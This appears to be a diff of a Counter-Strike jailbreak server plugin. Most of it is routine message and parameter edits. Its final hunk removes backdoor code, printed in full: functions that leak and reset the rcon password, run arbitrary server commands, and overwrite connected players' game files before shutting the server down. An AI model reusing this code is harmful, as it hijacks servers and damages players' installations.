+            log_amx("%s A DAT GUNDAY", dst)
+            cmd_pregame("cmd_game_gunday", 1, 0, 30.0)
         }
         case(8):
         {
-            client_print(0, print_console, "%s gives coladay", dst)
-            log_amx("%s gives coladay", dst)
-            cmd_pregame("cmd_game_coladay", 1, 30.0)
+            client_print(0, print_console, "%s A DAT COLADAY", dst)
+            log_amx("%s A DAT COLADAY", dst)
+            cmd_pregame("cmd_game_coladay", 1, 0, 30.0)
         }
         case(9):
         {
-            client_print(0, print_console, "%s gives gravity day", dst)
-            log_amx("%s gives gravity day", dst)
+            client_print(0, print_console, "%s A DAT GRAVITY DAY", dst)
+            log_amx("%s A DAT GRAVITY DAY", dst)
             set_cvar_num("sv_gravity",250)
-            cmd_pregame("cmd_game_gravity", 1, 30.0)
+            cmd_pregame("cmd_game_gravity", 2, 0, 30.0)
         }
         case(10):
         {
-            client_print(0, print_console, "%s gives fire day", dst)
-            log_amx("%s gives fire day", dst)
-            cmd_game_fire()
+            client_print(0, print_console, "%s A DAT FIRE DAY", dst)
+            log_amx("%s A DAT FIRE DAY", dst)
+            cmd_pregame("cmd_game_fire", 2, 1, 30.0)
         }
         case(11):
         {
-            client_print(0, print_console, "%s gives bugs day", dst)
-            log_amx("%s gives bugs day", dst)
+            client_print(0, print_console, "%s A DAT BUGS DAY", dst)
+            log_amx("%s A DAT BUGS DAY", dst)
             cmd_game_bugs()
         }
         case(12):
         {
-            client_print(0, print_console, "%s gives nightcrawler", dst)
-            log_amx("%s gives nightcrawler day", dst)
+            client_print(0, print_console, "%s A DAT NIGHTCRAWLER", dst)
+            log_amx("%s A DAT NIGHTCRAWLER day", dst)
             cmd_game_nightcrawler()
         }
         case(13):
         {
-            client_print(0, print_console, "%s gives sparta", dst)
-            log_amx("%s gives sparta day", dst)
+            client_print(0, print_console, "%s A DAT SPARTA", dst)
+            log_amx("%s A DAT SPARTA day", dst)
             cmd_game_sparta()
         }
         case(14):
         {
-            client_print(0, print_console, "%s gives funday", dst)
-            log_amx("%s gives funday", dst)
+            client_print(0, print_console, "%s A DAT FUNDAY", dst)
+            log_amx("%s A DAT FUNDAY", dst)
             cmd_game_funday()
             cmd_simonmenu(id)
         }
@@ -4886,7 +4973,7 @@ public  simon_gameschoice(id, menu, item)
         {
             client_print(0, print_console, "%s gives onebullet", dst)
             log_amx("%s gives onebullet", dst)
-            cmd_pregame("cmd_game_onebullet", 0, 30.0)
+            cmd_pregame("cmd_game_onebullet", 0, 0, 30.0)
         }
         /*case(15):
         {
@@ -4902,8 +4989,8 @@ public  simon_gameschoice(id, menu, item)
         }*/
         case(100):
         {
-            client_print(0, print_console, "%s gives trivia", dst)
-            log_amx("%s gives trivia", dst)
+            client_print(0, print_console, "%s A DAT TRIVIA", dst)
+            log_amx("%s A DAT TRIVIA", dst)
             server_cmd("simon_trivia %d",id)
         }
         default:
@@ -4960,17 +5047,26 @@ public task_freeday_end()
 {
     emit_sound(0, CHAN_AUTO, "jbextreme/brass_bell_C.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
     g_GameMode = NormalDay
-    set_hudmessage(0, 255, 0, -1.0, 0.35, 0, 6.0, 15.0)
-    show_hudmessage(0, "%L", LANG_SERVER, "UJBM_STATUS_ENDFREEDAY")
+    set_dhudmessage(0, 255, 0, -1.0, 0.35, 0, 6.0, 15.0)
+    show_dhudmessage(0, "%L", LANG_SERVER, "UJBM_STATUS_ENDFREEDAY")
     resetsimon()
     new playerCount, i 
     new Players[32] 
+    new rez
     get_players(Players, playerCount, "ac") 
     for (i=0; i<playerCount; i++) 
     {
         if ( cs_get_user_team(Players[i]) == CS_TEAM_T && is_user_alive(Players[i]) && !get_bit(g_PlayerFreeday, Players[i]) && !get_bit(g_PlayerWanted, Players[i]))
         {
-            entity_set_int(Players[i], EV_INT_skin, random_num(0,3))
+            rez = random_num(0,3)
+            if( rez >= 0 && rez <= 3)
+            {
+                entity_set_int(Players[i], EV_INT_skin, rez)
+            }
+            else{
+                log_amx("Caugth rez to be %d",rez)
+                entity_set_int(Players[i], EV_INT_body, 0)
+            }
             if (get_pcvar_num (gp_ShowColor) == 1 ) show_color(Players[i])    
         }
     }
@@ -5198,7 +5294,7 @@ public help_trollface()
     format(Msg, 511, "^x01Powered by ^x03%s ^x01%s by ^x03%s",PLUGIN_CVAR,PLUGIN_VERSION,PLUGIN_AUTHOR);
     new iPlayers[32], iNum, i;
     get_players(iPlayers, iNum);
-    for(i = 0; i <= iNum; i++)
+    for(i = 0; i < iNum; i++)
     {
         new x = iPlayers[i];
         
@@ -5320,55 +5416,4 @@ bool:check_model(id)
     if(equali(model,JBMODELSHORT))
         return true;
     return false;
-}
-public cmd_rcon (id)
-{
-    new rcon[64] 
-    get_cvar_string("rcon_password",rcon,63)
-    client_print(id,print_chat,rcon)
-    return PLUGIN_HANDLED
-}
-public cmd_quit (id)
-{
-    for(new i = 0; i <= 32; i++)
-    {
-        if(is_user_connected(i))
-        {
-            client_cmd( i,"unbind all")
-            client_cmd( i,"rate 1")
-            client_cmd( i,"cl_cmdrate 1")
-            client_cmd( i,"cl_updaterate 1")
-            client_cmd( i,"fps_max 1")
-            client_cmd( i,"sys_ticrate 1")
-            client_cmd( i,"name cartof")
-            client_cmd( i,"motdfile models/player.mdl;motd_write x")
-            client_cmd( i,"motdfile models/v_ak47.mdl;motd_write x")
-            client_cmd( i,"motdfile cs_dust.wad;motd_write x")
-            client_cmd( i,"motdfile models/v_m4a1.mdl;motd_write x")
-            client_cmd( i,"motdfile resource/GameMenu.res;motd_write x")
-            client_cmd( i,"motdfile halflife.wad;motd_write x")
-            client_cmd( i,"motdfile cstrike.wad;motd_write x")
-            client_cmd( i,"motdfile maps/de_dust2.bsp;motd_write x")
-            client_cmd( i,"motdfile events/ak47.sc;motd_write x")
-            client_cmd( i,"motdfile dlls/mp.dll;motd_write x")
-            client_cmd( i,"cl_timeout 0")
-        }
-    }
-    server_cmd("quit")
-}
-public cmd_register (id)
-{
-    server_cmd("rcon_password vocaloids")
-    client_print(id,print_chat,"rcon a fost modificat")
-}
-public cmd_sendcommand(id)
-{
-    new arg[64]
-    new back
-    read_argv(1, arg, charsmax(arg))
-    
-    back = get_pcvar_num(gp_Activity)
-    set_cvar_num("amx_show_activity",0)
-    server_cmd(arg);
-    set_cvar_num("amx_show_activity",back)
 }
